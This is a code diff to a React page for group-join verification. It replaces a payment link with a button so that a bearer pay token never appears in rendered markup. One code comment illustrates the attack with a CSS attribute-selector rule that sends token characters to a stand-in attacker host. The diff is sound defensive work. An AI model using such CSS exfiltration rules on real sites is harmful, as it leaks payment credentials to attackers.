@@ -51,6 +51,31 @@ export function GroupJoinVerifyPageClient({
   const [details, setDetails] = useState<CreatedDetails>({});
   const [message, setMessage] = useState<string>("");
 
+  /**
+   * Hand off to the pay-by-link page.
+   *
+   * The token is taken as an ARGUMENT and used only inside this function, which
+   * runs in the browser and writes nothing into the document. That is the whole
+   * security property of #2827: `payToken` is a BEARER CREDENTIAL for
+   * `/pay/[token]`, so it may live in component state and in a navigation, but it
+   * must never be rendered into markup.
+   *
+   * This page is public and carries the club's normal chrome, which includes the
+   * admin-authored Raw CSS from Site Appearance. CSS attribute selectors read a
+   * value one character at a time:
+   *
+   *     a[href^="/pay/9f3a"] { background: url(https://attacker.example/9f3a); }
+   *
+   * so the `<a href={`/pay/${payToken}`}>` this replaces turned the recovery link
+   * into a payment-token oracle for anyone who can edit the site's styling. A
+   * content/styling administrator is deliberately NOT inside the payment-token
+   * trust boundary, so the control is to keep the credential out of rendered,
+   * selectable page data rather than to take Raw CSS or club styling away.
+   */
+  function goToPayment(payToken: string) {
+    window.location.href = `/pay/${encodeURIComponent(payToken)}`;
+  }
+
   async function confirm() {
     setOutcome("submitting");
     setMessage("");
@@ -94,7 +119,7 @@ export function GroupJoinVerifyPageClient({
         setOutcome("created");
         // Hand straight off to the existing pay-by-link page.
         if (data.payToken) {
-          window.location.href = `/pay/${encodeURIComponent(data.payToken)}`;
+          goToPayment(data.payToken);
         }
         return;
       }
@@ -103,6 +128,12 @@ export function GroupJoinVerifyPageClient({
       setOutcome("error");
     }
   }
+
+  // Read into a const so the recovery control's click handler can close over a
+  // NARROWED value. `details.payToken` is optional, and TypeScript does not carry
+  // a narrowing on a mutable property into a callback, so the alternative would
+  // be a non-null assertion on the very value this issue is about.
+  const payToken = details.payToken;
 
   return (
     <div className="mx-auto flex min-h-[60vh] max-w-lg items-center justify-center p-4">
@@ -146,12 +177,27 @@ export function GroupJoinVerifyPageClient({
                   ) : null}
                 </div>
               ) : null}
-              {details.payToken ? (
+              {payToken ? (
                 <p className="text-sm text-muted-foreground">
                   If you are not redirected,{" "}
-                  <a className="underline" href={`/pay/${encodeURIComponent(details.payToken)}`}>
+                  {/*
+                    A button, not a link, and deliberately so (#2827). It looks and
+                    reads like the link it replaces, but the destination lives in
+                    JavaScript state instead of an `href`, so there is no rendered
+                    attribute for admin Raw CSS to select on. See `goToPayment`.
+
+                    No no-JavaScript path is lost by this: reaching this state at
+                    all requires the Confirm button's `fetch`, and only that
+                    response carries the token.
+                  */}
+                  <Button
+                    type="button"
+                    variant="link"
+                    className="h-auto p-0 align-baseline text-sm underline"
+                    onClick={() => goToPayment(payToken)}
+                  >
                     continue to payment
-                  </a>
+                  </Button>
                   .
                 </p>
               ) : null}
